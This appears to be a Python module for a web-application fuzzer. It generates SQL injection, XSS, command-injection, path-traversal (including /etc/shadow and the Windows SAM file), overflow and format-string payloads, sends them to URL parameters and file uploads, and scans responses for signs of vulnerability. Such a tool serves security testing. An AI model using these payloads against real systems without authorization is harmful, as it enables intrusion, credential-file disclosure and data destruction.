import random
import string
import time
import requests
from urllib.parse import urljoin, urlparse
from rich.console import Console
from config.config_manager import ConfigManager

console = Console()

class Fuzzer:
    def __init__(self):
        self.config_manager = ConfigManager()

    def generate_payloads(self, payload_type="sql", count=100):
        """Generate fuzzing payloads"""
        payloads = []

        if payload_type == "sql":
            sql_payloads = [
                "'", "''", "' OR '1'='1", "' OR '1'='1' --",
                "' UNION SELECT NULL --", "'; DROP TABLE users --",
                "' AND 1=0 UNION SELECT username, password FROM users --",
                "admin' --", "' OR ''='", "') OR ('1'='1",
                "' UNION SELECT database() --", "' UNION SELECT table_name FROM information_schema.tables --"
            ]
            payloads.extend(sql_payloads)

        elif payload_type == "xss":
            xss_payloads = [
                "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>", "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>", "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>", "<select onfocus=alert('XSS')><option></option></select>",
                "<textarea onfocus=alert('XSS')>", "<div onmouseover=alert('XSS')>hover me</div>"
            ]
            payloads.extend(xss_payloads)

        elif payload_type == "command":
            cmd_payloads = [
                "; ls -la", "| cat /etc/passwd", "`cat /etc/passwd`",
                "$(cat /etc/passwd)", "; id", "| id", "`id`",
                "$(id)", "; whoami", "| whoami", "`whoami`",
                "$(whoami)", "; pwd", "| pwd"
            ]
            payloads.extend(cmd_payloads)

        elif payload_type == "path_traversal":
            path_payloads = [
                "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
                "/etc/passwd", "/etc/shadow", "/etc/hosts",
                "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
            ]
            payloads.extend(path_payloads)

        elif payload_type == "buffer_overflow":
            # Generate various length strings
            for length in [100, 1000, 10000, 50000]:
                payloads.append("A" * length)
                payloads.append("A" * (length - 1) + "\x00")
                payloads.append("A" * (length // 2) + "B" * (length // 2))

        elif payload_type == "format_string":
            format_payloads = [
                "%s", "%x", "%n", "%p", "%d",
                "AAAA%x%x%x%x", "%08x.%08x.%08x.%08x",
                "%s%s%s%s%s%s%s%s%s%s", "%n%n%n%n"
            ]
            payloads.extend(format_payloads)

        # Generate random payloads if needed
        while len(payloads) < count:
            if payload_type == "random":
                length = random.randint(1, 1000)
                chars = string.ascii_letters + string.digits + string.punctuation
                payloads.append(''.join(random.choice(chars) for _ in range(length)))
            else:
                # Add variations of existing payloads
                base = random.choice(payloads[:10] if payloads else "test")
                variations = [
                    base.upper(),
                    base.lower(),
                    base + " " + base,
                    base * 2,
                    base + random.choice(string.punctuation),
                    base.replace(" ", "\t"),
                    base.replace(" ", "\n"),
                    base.encode('utf-8').decode('latin-1', errors='ignore')
                ]
                payloads.extend(variations)

        return payloads[:count]

    def fuzz_web_parameter(self, url, param_name, payloads=None, method="GET", headers=None):
        """Fuzz a web parameter"""
        if payloads is None:
            payloads = self.generate_payloads("sql", 50)

        results = []
        parsed_url = urlparse(url)

        for payload in payloads:
            try:
                if method.upper() == "GET":
                    test_url = f"{url}{'&' if '?' in url else '?'}{param_name}={payload}"
                    response = requests.get(test_url, headers=headers, timeout=10)
                elif method.upper() == "POST":
                    data = {param_name: payload}
                    response = requests.post(url, data=data, headers=headers, timeout=10)
                else:
                    continue

                # Check for interesting responses
                interesting = self._analyze_response(response, payload)

                if interesting:
                    results.append({
                        "payload": payload,
                        "url": test_url if method.upper() == "GET" else url,
                        "method": method,
                        "status_code": response.status_code,
                        "response_length": len(response.text),
                        "interesting": interesting,
                        "response_preview": response.text[:200] + "..." if len(response.text) > 200 else response.text
                    })

                time.sleep(0.1)  # Rate limiting

            except requests.exceptions.RequestException as e:
                results.append({
                    "payload": payload,
                    "error": str(e),
                    "method": method
                })

        return results

    def fuzz_file_upload(self, url, field_name, payloads=None, headers=None):
        """Fuzz file upload functionality"""
        if payloads is None:
            payloads = self.generate_payloads("path_traversal", 20)

        results = []

        for payload in payloads:
            try:
                files = {field_name: (payload, payload, 'text/plain')}
                response = requests.post(url, files=files, headers=headers, timeout=10)

                interesting = self._analyze_response(response, payload)

                if interesting:
                    results.append({
                        "payload": payload,
                        "status_code": response.status_code,
                        "response_length": len(response.text),
                        "interesting": interesting,
                        "response_preview": response.text[:200] + "..." if len(response.text) > 200 else response.text
                    })

                time.sleep(0.1)

            except requests.exceptions.RequestException as e:
                results.append({
                    "payload": payload,
                    "error": str(e)
                })

        return results

    def fuzz_command_injection(self, target_function, payloads=None):
        """Fuzz for command injection vulnerabilities"""
        if payloads is None:
            payloads = self.generate_payloads("command", 30)

        results = []

        for payload in payloads:
            try:
                # This would need to be adapted based on how the target accepts input
                # For demonstration, we'll simulate command execution
                console.print(f"[dim]Testing payload: {payload}[/dim]")

                # In a real scenario, this would execute the command and check results
                # For now, we'll just log the attempt
                results.append({
                    "payload": payload,
                    "executed": False,  # Would be True if actually executed
                    "output": "Command injection test",
                    "vulnerable": False  # Would be determined by output analysis
                })

            except Exception as e:
                results.append({
                    "payload": payload,
                    "error": str(e)
                })

        return results

    def _analyze_response(self, response, payload):
        """Analyze HTTP response for signs of vulnerability"""
        interesting_indicators = []

        # Check for SQL errors
        sql_errors = [
            "sql syntax", "mysql error", "postgresql error", "sqlite error",
            "ora-", "microsoft sql", "syntax error", "unclosed quotation"
        ]
        if any(error in response.text.lower() for error in sql_errors):
            interesting_indicators.append("sql_error")

        # Check for XSS reflection
        if payload in response.text and "<script>" in payload.lower():
            interesting_indicators.append("xss_reflection")

        # Check for path traversal success
        if "root:" in response.text or "etc/passwd" in response.text:
            interesting_indicators.append("path_traversal")

        # Check for command injection
        if "uid=" in response.text or "gid=" in response.text:
            interesting_indicators.append("command_injection")

        # Check for unusual response codes
        if response.status_code in [200, 302, 500, 403]:
            interesting_indicators.append("unusual_status")

        # Check for response length changes
        if len(response.text) > 10000:  # Large response might indicate file disclosure
            interesting_indicators.append("large_response")

        return interesting_indicators if interesting_indicators else None

    def create_custom_payloads(self, base_strings, mutations=None):
        """Create custom payloads from base strings with mutations"""
        if mutations is None:
            mutations = [
                lambda x: x,  # Original
                lambda x: x.upper(),
                lambda x: x.lower(),
                lambda x: x + " ",
                lambda x: " " + x,
                lambda x: x + x,
                lambda x: x[::-1],  # Reverse
                lambda x: x.replace(" ", "\t"),
                lambda x: x.replace(" ", "\n"),
                lambda x: x.replace(" ", "\r\n"),
            ]

        payloads = []
        for base in base_strings:
            for mutation in mutations:
                try:
                    payloads.append(mutation(base))
                except:
                    continue

        return payloads
